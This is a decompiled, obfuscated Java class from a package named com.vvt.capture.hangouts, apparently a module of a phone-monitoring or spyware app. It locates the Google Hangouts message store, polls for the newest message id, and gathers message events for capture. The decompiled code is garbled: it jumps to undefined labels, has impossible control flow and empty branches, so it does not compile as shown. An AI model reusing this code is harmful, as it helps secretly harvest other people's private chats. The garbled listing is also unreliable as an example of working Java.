package com.vvt.capture.hangouts.a;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.hangouts.d;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private long d = -1;
  private String e;
  private com.vvt.base.b f;
  
  public b(String paramString, com.vvt.base.b paramb)
  {
    this.e = paramString;
    this.f = paramb;
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    bool1 = false;
    Object localObject1 = null;
    try
    {
      String str = com.vvt.n.a.b.b.b();
      if (str == null) {
        break label207;
      }
      localObject1 = com.vvt.n.a.b.b.a(str);
      localObject2 = localObject1;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject2;
        long l2;
        long l3;
        int j;
        boolean bool4;
        boolean bool2 = c;
        if (bool2)
        {
          continue;
          this.d = l3;
          continue;
          localObject2 = null;
        }
      }
    }
    if (localObject2 != null)
    {
      l2 = d.a((String)localObject2);
      bool1 = false;
      localObject1 = null;
      l3 = l2;
      j = 0;
      for (;;)
      {
        boolean bool3 = l3 < l1;
        if (bool3) {
          break;
        }
        int k = 5;
        if (j >= k) {
          break;
        }
        l3 = 2000L;
        SystemClock.sleep(l3);
        long l4 = d.a((String)localObject2);
        int i = j + 1;
        j = i;
        l3 = l4;
      }
    }
    bool2 = c;
    if (bool2) {}
    l3 = l1;
    bool4 = l3 < l1;
    if (!bool4)
    {
      bool2 = b;
      if (bool2) {}
      l3 = this.d;
      localObject1 = Long.valueOf(l3);
      localFxSimpleEventReference.setReference((Long)localObject1);
      bool2 = a;
      if (bool2) {}
      return localFxSimpleEventReference;
    }
  }
  
  public List a(int paramInt)
  {
    String str1 = null;
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      str2 = com.vvt.n.a.b.b.b();
      if (str2 == null) {
        break label183;
      }
      localObject1 = com.vvt.n.a.b.b.a(str2);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        String str2;
        Object localObject1;
        boolean bool2;
        long l1;
        long l2;
        long l3;
        long l4;
        com.vvt.base.b localb;
        bool1 = c;
        if (bool1)
        {
          continue;
          bool1 = false;
          Object localObject2 = null;
        }
      }
    }
    bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    bool2 = com.vvt.ag.b.a((String)localObject1);
    if (!bool2)
    {
      bool2 = com.vvt.ag.b.a(str2);
      if (!bool2)
      {
        l1 = d.a(paramInt, (String)localObject1);
        l2 = 1L;
        l3 = l1 - l2;
        l4 = d.a((String)localObject1);
        str1 = this.e;
        localb = this.f;
      }
    }
    for (localObject1 = d.a((String)localObject1, str1, l3, l4, str2, localb);; localObject1 = null)
    {
      localArrayList.addAll((Collection)localObject1);
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      bool1 = c;
      if (bool1) {}
      bool1 = false;
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    String str1 = null;
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      localObject1 = paramg1.getReference();
      localObject1 = (Long)localObject1;
      l1 = ((Long)localObject1).longValue();
      localObject1 = paramg2.getReference();
      localObject1 = (Long)localObject1;
      l2 = ((Long)localObject1).longValue();
      str2 = com.vvt.n.a.b.b.b();
      if (str2 == null) {
        break label211;
      }
      localObject1 = com.vvt.n.a.b.b.a(str2);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        long l1;
        long l2;
        String str2;
        boolean bool2;
        com.vvt.base.b localb;
        bool1 = c;
        if (bool1)
        {
          continue;
          bool1 = false;
          Object localObject2 = null;
        }
      }
    }
    bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    bool2 = com.vvt.ag.b.a((String)localObject1);
    if (!bool2)
    {
      bool2 = com.vvt.ag.b.a(str2);
      if (!bool2)
      {
        str1 = this.e;
        localb = this.f;
      }
    }
    for (localObject1 = d.a((String)localObject1, str1, l1, l2, str2, localb);; localObject1 = null)
    {
      localArrayList.addAll((Collection)localObject1);
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      bool1 = c;
      if (bool1) {}
      bool1 = false;
    }
  }
  
  public void b()
  {
    this.d = -1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/hangouts/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */